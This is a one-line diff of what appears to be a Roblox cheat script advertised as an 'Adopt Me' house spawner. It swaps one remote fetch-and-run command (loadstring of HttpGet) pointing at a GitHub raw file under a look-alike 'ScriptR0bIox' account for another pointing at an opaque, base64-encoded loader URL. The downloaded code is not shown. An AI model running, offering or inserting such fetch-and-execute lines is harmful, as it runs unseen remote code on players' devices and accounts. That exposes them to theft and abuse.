@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptR0bIox/AdoptMe/refs/heads/main/HouseSpawner/script.lua"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWVob3VzZXNwYXduZXIifX0"))()
